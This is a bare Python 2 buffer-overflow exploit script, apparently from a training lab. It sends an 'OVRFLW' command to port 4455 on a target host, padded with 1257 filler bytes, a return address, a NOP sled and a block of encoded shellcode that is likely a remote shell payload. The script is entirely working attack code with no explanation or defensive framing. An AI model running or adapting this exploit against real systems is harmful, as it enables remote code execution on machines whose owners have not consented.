#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

#badcharas = "\x00\x04\x0d\x54\x69\x71\xa7"

shellcode = (
"\xbf\x35\xdd\x06\xc5\xd9\xea\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x7d\x12\x83\xed\xfc\x03\x48\xd3\xe4\x30\x4e\x03\x6a"
"\xba\xae\xd4\x0b\x32\x4b\xe5\x0b\x20\x18\x56\xbc\x22\x4c\x5b"
"\x37\x66\x64\xe8\x35\xaf\x8b\x59\xf3\x89\xa2\x5a\xa8\xea\xa5"
"\xd8\xb3\x3e\x05\xe0\x7b\x33\x44\x25\x61\xbe\x14\xfe\xed\x6d"
"\x88\x8b\xb8\xad\x23\xc7\x2d\xb6\xd0\x90\x4c\x97\x47\xaa\x16"
"\x37\x66\x7f\x23\x7e\x70\x9c\x0e\xc8\x0b\x56\xe4\xcb\xdd\xa6"
"\x05\x67\x20\x07\xf4\x79\x65\xa0\xe7\x0f\x9f\xd2\x9a\x17\x64"
"\xa8\x40\x9d\x7e\x0a\x02\x05\x5a\xaa\xc7\xd0\x29\xa0\xac\x97"
"\x75\xa5\x33\x7b\x0e\xd1\xb8\x7a\xc0\x53\xfa\x58\xc4\x38\x58"
"\xc0\x5d\xe5\x0f\xfd\xbd\x46\xef\x5b\xb6\x6b\xe4\xd1\x95\xe3"
"\xc9\xdb\x25\xf4\x45\x6b\x56\xc6\xca\xc7\xf0\x6a\x82\xc1\x07"
"\x8c\xb9\xb6\x97\x73\x42\xc7\xbe\xb7\x16\x97\xa8\x1e\x17\x7c"
"\x28\x9e\xc2\xd3\x78\x30\xbd\x93\x28\xf0\x6d\x7c\x22\xff\x52"
"\x9c\x4d\xd5\xfa\x37\xb4\xbe\xc4\x60\xad\x21\xad\x72\xd1\x7b"
"\x93\xfa\x37\xe9\xfb\xaa\xe0\x86\x62\xf7\x7a\x36\x6a\x2d\x07"
"\x78\xe0\xc2\xf8\x37\x01\xae\xea\xa0\xe1\xe5\x50\x66\xfd\xd3"
"\xfc\xe4\x6c\xb8\xfc\x63\x8d\x17\xab\x24\x63\x6e\x39\xd9\xda"
"\xd8\x5f\x20\xba\x23\xdb\xff\x7f\xad\xe2\x72\x3b\x89\xf4\x4a"
"\xc4\x95\xa0\x02\x93\x43\x1e\xe5\x4d\x22\xc8\xbf\x22\xec\x9c"
"\x46\x09\x2f\xda\x46\x44\xd9\x02\xf6\x31\x9c\x3d\x37\xd6\x28"
"\x46\x25\x46\xd6\x9d\xed\x76\x9d\xbf\x44\x1f\x78\x2a\xd5\x42"
"\x7b\x81\x1a\x7b\xf8\x23\xe3\x78\xe0\x46\xe6\xc5\xa6\xbb\x9a"
"\x56\x43\xbb\x09\x56\x46")
cmd = "OVRFLW "
junk = "\x41" *1257 + "\x83\x66\x52\x56" + "\x90" * 16 + shellcode + "\x43" * (3000-1257-4-16-351)
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
